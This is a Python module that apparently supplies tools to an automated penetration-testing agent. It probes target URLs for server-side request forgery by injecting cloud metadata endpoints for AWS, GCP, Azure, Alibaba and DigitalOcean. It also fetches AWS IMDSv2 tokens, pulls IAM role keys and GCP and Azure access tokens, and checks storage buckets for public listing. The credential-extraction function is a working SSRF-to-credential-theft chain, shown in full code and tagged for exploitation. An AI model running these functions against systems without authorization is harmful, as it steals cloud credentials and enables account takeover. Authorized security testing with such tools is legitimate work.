"""Cloud metadata and SSRF chain testing tool wrappers."""

from __future__ import annotations

import re
import shutil
from typing import Any
from urllib.parse import quote, urlencode, urlparse, urlunparse, parse_qs

from core.config import Config
from core.tool_registry import Tool
from utils.utils import run_cmd, sanitize_subprocess_arg


# ---------------------------------------------------------------------------
# Cloud metadata endpoint definitions
# ---------------------------------------------------------------------------

_METADATA_ENDPOINTS: dict[str, dict[str, Any]] = {
    "aws_imdsv1": {
        "url": "http://169.254.169.254/latest/meta-data/",
        "headers": [],
        "indicators": ["ami-id", "instance-id", "local-hostname", "public-hostname",
                        "iam", "security-credentials", "instance-type"],
        "label": "AWS IMDSv1",
    },
    "gcp": {
        "url": "http://metadata.google.internal/computeMetadata/v1/",
        "headers": ["Metadata-Flavor: Google"],
        "indicators": ["project/", "instance/", "attributes/", "service-accounts/"],
        "label": "GCP Metadata",
    },
    "azure": {
        "url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "headers": ["Metadata: true"],
        "indicators": ["vmId", "subscriptionId", "resourceGroupName", "location",
                        "osType", "vmSize"],
        "label": "Azure IMDS",
    },
    "alibaba": {
        "url": "http://100.100.100.200/latest/meta-data/",
        "headers": [],
        "indicators": ["instance-id", "region-id", "zone-id", "owner-account-id",
                        "hostname", "image-id"],
        "label": "Alibaba Cloud Metadata",
    },
    "digitalocean": {
        "url": "http://169.254.169.254/metadata/v1/",
        "headers": [],
        "indicators": ["droplet_id", "hostname", "region", "interfaces", "dns",
                        "id", "vendor-data"],
        "label": "DigitalOcean Metadata",
    },
}


def _curl_request(
    url: str,
    method: str = "GET",
    headers: list[str] | None = None,
    timeout: int = 10,
) -> dict[str, Any]:
    """Issue a curl request and return structured output."""
    url = sanitize_subprocess_arg(url, "url")
    method = sanitize_subprocess_arg(method, "generic").upper()

    cmd = ["curl", "-s", "-i", "-X", method, "--max-time", str(timeout)]
    for hdr in headers or []:
        cmd.extend(["-H", hdr])
    cmd.append(url)
    return run_cmd(cmd, timeout=timeout + 5)


def _inject_into_param(base_url: str, param: str, payload: str) -> str:
    """Replace or append *param* in *base_url* query string with *payload*."""
    parsed = urlparse(base_url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [payload]
    new_query = urlencode(qs, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


def _response_matches(stdout: str, indicators: list[str]) -> list[str]:
    """Return which indicator strings appear in the response body."""
    body = stdout.lower()
    return [ind for ind in indicators if ind.lower() in body]


# ---------------------------------------------------------------------------
# 1. SSRF metadata test
# ---------------------------------------------------------------------------

def ssrf_metadata_test(
    url: str,
    param: str = "",
    method: str = "GET",
) -> dict[str, Any]:
    """Test if a URL parameter is vulnerable to SSRF by probing cloud metadata endpoints.

    If *param* is provided, the metadata URL is injected into that query
    parameter of *url*.  Otherwise *url* is tested directly (useful when the
    caller already controls the destination).
    """
    url = sanitize_subprocess_arg(url, "url")
    method = sanitize_subprocess_arg(method, "generic").upper()
    if param:
        param = sanitize_subprocess_arg(param, "generic")

    findings: dict[str, dict[str, Any]] = {}
    ssrf_confirmed = False

    # --- Standard metadata endpoints ---
    for provider_key, meta in _METADATA_ENDPOINTS.items():
        target_url = (
            _inject_into_param(url, param, meta["url"]) if param else meta["url"]
        )

        result = _curl_request(target_url, method=method, headers=meta["headers"])
        stdout = result.get("stdout", "")
        matched = _response_matches(stdout, meta["indicators"])

        entry: dict[str, Any] = {
            "label": meta["label"],
            "tested_url": target_url,
            "status": "not_vulnerable",
            "matched_indicators": matched,
            "response_snippet": stdout[:500],
        }

        if matched:
            entry["status"] = "vulnerable"
            ssrf_confirmed = True

        findings[provider_key] = entry

    # --- AWS IMDSv2 token fetch ---
    imdsv2_token_url = "http://169.254.169.254/latest/api/token"
    if param:
        token_target = _inject_into_param(url, param, imdsv2_token_url)
    else:
        token_target = imdsv2_token_url

    token_result = _curl_request(
        token_target,
        method="PUT",
        headers=["X-aws-ec2-metadata-token-ttl-seconds: 21600"],
    )
    token_stdout = token_result.get("stdout", "")

    # A valid IMDSv2 token is a base64-ish string returned in the body
    imdsv2_entry: dict[str, Any] = {
        "label": "AWS IMDSv2 Token",
        "tested_url": token_target,
        "status": "not_vulnerable",
        "response_snippet": token_stdout[:500],
    }
    # If we got a long token-like string (no HTML, no error page) it is likely valid
    body_lines = token_stdout.split("\r\n\r\n", 1)
    token_body = body_lines[1].strip() if len(body_lines) > 1 else token_stdout.strip()
    if len(token_body) > 20 and "<" not in token_body and "error" not in token_body.lower():
        imdsv2_entry["status"] = "vulnerable"
        imdsv2_entry["token_value"] = token_body[:80]
        ssrf_confirmed = True

    findings["aws_imdsv2"] = imdsv2_entry

    return {
        "findings": findings,
        "ssrf_confirmed": ssrf_confirmed,
        "providers_tested": list(findings.keys()),
        "stdout": "",
        "stderr": "",
        "returncode": 0,
    }


# ---------------------------------------------------------------------------
# 2. IMDS credential extraction
# ---------------------------------------------------------------------------

def _mask_secret(value: str) -> str:
    """Show first 4 and last 4 characters, mask the rest."""
    if len(value) <= 12:
        return value[:4] + "****" + value[-4:] if len(value) > 8 else "****"
    return value[:4] + "*" * (len(value) - 8) + value[-4:]


def imds_credential_extract(
    url: str,
    param: str = "",
) -> dict[str, Any]:
    """Attempt credential extraction from cloud IMDS after confirming SSRF.

    Targets AWS IAM role credentials, GCP service-account tokens, and Azure
    managed-identity tokens.
    """
    url = sanitize_subprocess_arg(url, "url")
    if param:
        param = sanitize_subprocess_arg(param, "generic")

    results: dict[str, Any] = {}

    # --- AWS: discover role then fetch temporary credentials ---
    aws_roles_url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    target = _inject_into_param(url, param, aws_roles_url) if param else aws_roles_url
    role_resp = _curl_request(target)
    role_stdout = role_resp.get("stdout", "")
    body_parts = role_stdout.split("\r\n\r\n", 1)
    role_body = body_parts[1].strip() if len(body_parts) > 1 else role_stdout.strip()

    aws_entry: dict[str, Any] = {"found": False}
    if role_body and "<" not in role_body and "error" not in role_body.lower():
        role_name = role_body.splitlines()[0].strip()
        if role_name:
            cred_url = f"{aws_roles_url}{quote(role_name)}"
            cred_target = _inject_into_param(url, param, cred_url) if param else cred_url
            cred_resp = _curl_request(cred_target)
            cred_stdout = cred_resp.get("stdout", "")
            cred_body_parts = cred_stdout.split("\r\n\r\n", 1)
            cred_body = cred_body_parts[1].strip() if len(cred_body_parts) > 1 else cred_stdout.strip()

            aws_entry["found"] = True
            aws_entry["role"] = role_name

            # Try to parse JSON-ish keys
            access_match = re.search(r'"AccessKeyId"\s*:\s*"([^"]+)"', cred_body)
            secret_match = re.search(r'"SecretAccessKey"\s*:\s*"([^"]+)"', cred_body)
            token_match = re.search(r'"Token"\s*:\s*"([^"]+)"', cred_body)

            if access_match:
                aws_entry["AccessKeyId"] = _mask_secret(access_match.group(1))
            if secret_match:
                aws_entry["SecretAccessKey"] = _mask_secret(secret_match.group(1))
            if token_match:
                aws_entry["Token"] = _mask_secret(token_match.group(1))

    results["aws"] = aws_entry

    # --- GCP: service-account default token ---
    gcp_token_url = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
    gcp_target = _inject_into_param(url, param, gcp_token_url) if param else gcp_token_url
    gcp_resp = _curl_request(gcp_target, headers=["Metadata-Flavor: Google"])
    gcp_stdout = gcp_resp.get("stdout", "")
    gcp_body_parts = gcp_stdout.split("\r\n\r\n", 1)
    gcp_body = gcp_body_parts[1].strip() if len(gcp_body_parts) > 1 else gcp_stdout.strip()

    gcp_entry: dict[str, Any] = {"found": False}
    token_val = re.search(r'"access_token"\s*:\s*"([^"]+)"', gcp_body)
    if token_val:
        gcp_entry["found"] = True
        gcp_entry["access_token"] = _mask_secret(token_val.group(1))
    results["gcp"] = gcp_entry

    # --- Azure: managed-identity OAuth token ---
    azure_token_url = (
        "http://169.254.169.254/metadata/identity/oauth2/token"
        "?api-version=2018-02-01"
        "&resource=https://management.azure.com/"
    )
    azure_target = _inject_into_param(url, param, azure_token_url) if param else azure_token_url
    azure_resp = _curl_request(azure_target, headers=["Metadata: true"])
    azure_stdout = azure_resp.get("stdout", "")
    azure_body_parts = azure_stdout.split("\r\n\r\n", 1)
    azure_body = azure_body_parts[1].strip() if len(azure_body_parts) > 1 else azure_stdout.strip()

    azure_entry: dict[str, Any] = {"found": False}
    az_token = re.search(r'"access_token"\s*:\s*"([^"]+)"', azure_body)
    if az_token:
        azure_entry["found"] = True
        azure_entry["access_token"] = _mask_secret(az_token.group(1))
    results["azure"] = azure_entry

    credentials_found = any(v.get("found") for v in results.values())

    return {
        "credentials": results,
        "credentials_found": credentials_found,
        "stdout": "",
        "stderr": "",
        "returncode": 0,
    }


# ---------------------------------------------------------------------------
# 3. S3 / blob storage misconfiguration check
# ---------------------------------------------------------------------------

_LISTING_INDICATORS = [
    "<ListBucketResult",
    "<EnumerationResults",
    "<ListAllMyBucketsResult",
    "<Contents>",
    "<Blobs>",
]

_ACCESS_DENIED_INDICATORS = [
    "AccessDenied",
    "Access Denied",
    "AuthorizationFailure",
    "BlobNotFound",
    "NoSuchBucket",
    "InvalidBucketName",
    "AccountIsDisabled",
]


def s3_bucket_check(domain: str) -> dict[str, Any]:
    """Check for S3/blob storage misconfigurations across cloud providers.

    Probes virtual-hosted, path-style, and provider-specific bucket URLs
    looking for public listing or readable content.
    """
    domain = sanitize_subprocess_arg(domain, "generic")
    # Strip protocol and trailing slashes
    domain = re.sub(r"^https?://", "", domain).strip("/")

    bucket_urls: dict[str, str] = {
        "aws_vhost": f"https://{domain}.s3.amazonaws.com/",
        "aws_path": f"https://s3.amazonaws.com/{domain}/",
        "azure_blob": f"https://{domain}.blob.core.windows.net/",
        "gcp_storage": f"https://storage.googleapis.com/{domain}/",
    }

    findings: dict[str, dict[str, Any]] = {}
    any_listing = False

    for label, bucket_url in bucket_urls.items():
        result = _curl_request(bucket_url, timeout=10)
        stdout = result.get("stdout", "")

        entry: dict[str, Any] = {
            "url": bucket_url,
            "status": "unknown",
            "response_snippet": stdout[:600],
        }

        listing_match = [ind for ind in _LISTING_INDICATORS if ind in stdout]
        denied_match = [ind for ind in _ACCESS_DENIED_INDICATORS if ind in stdout]

        if listing_match:
            entry["status"] = "public_listing"
            entry["matched_indicators"] = listing_match
            any_listing = True
        elif denied_match:
            entry["status"] = "access_denied"
            entry["matched_indicators"] = denied_match
        elif result.get("returncode", -1) != 0:
            entry["status"] = "error"
        else:
            # Check HTTP status from response headers
            status_match = re.search(r"HTTP/[\d.]+ (\d+)", stdout)
            if status_match:
                code = int(status_match.group(1))
                if code == 200:
                    entry["status"] = "accessible"
                elif code == 403:
                    entry["status"] = "access_denied"
                elif code == 404:
                    entry["status"] = "not_found"
                else:
                    entry["status"] = f"http_{code}"

        findings[label] = entry

    return {
        "findings": findings,
        "public_listing_found": any_listing,
        "domain_tested": domain,
        "stdout": "",
        "stderr": "",
        "returncode": 0,
    }


# ---------------------------------------------------------------------------
# 4. Tool registration
# ---------------------------------------------------------------------------

def register_cloud_tools(config: Config) -> list[Tool]:
    """Register cloud metadata and storage testing tools if curl is available."""
    if not shutil.which("curl"):
        return []

    tools: list[Tool] = []

    tools.append(Tool(
        name="ssrf_metadata_test",
        description=(
            "Test a URL for SSRF by injecting cloud metadata endpoint URLs "
            "(AWS, GCP, Azure, Alibaba, DigitalOcean). Checks whether the "
            "server follows the request and returns metadata indicators."
        ),
        parameters={
            "url": "Target URL to test for SSRF (e.g., https://example.com/fetch?url=)",
            "param": "Query parameter to inject metadata URL into (optional, tests URL directly if omitted)",
            "method": "HTTP method - GET or POST (default: GET)",
        },
        example='ssrf_metadata_test(url="https://example.com/proxy?url=", param="url")',
        phase_tags=["vulnerability_scan", "exploitation"],
        execute=ssrf_metadata_test,
    ))

    tools.append(Tool(
        name="s3_bucket_check",
        description=(
            "Check for public S3/blob storage misconfigurations. Tests "
            "AWS S3 (virtual-hosted and path-style), Azure Blob Storage, "
            "and GCP Cloud Storage for directory listing or public access."
        ),
        parameters={
            "domain": "Domain or bucket name to check (e.g., example-assets or example.com)",
        },
        example='s3_bucket_check(domain="example-assets")',
        phase_tags=["vulnerability_scan", "exploitation"],
        execute=s3_bucket_check,
    ))

    return tools
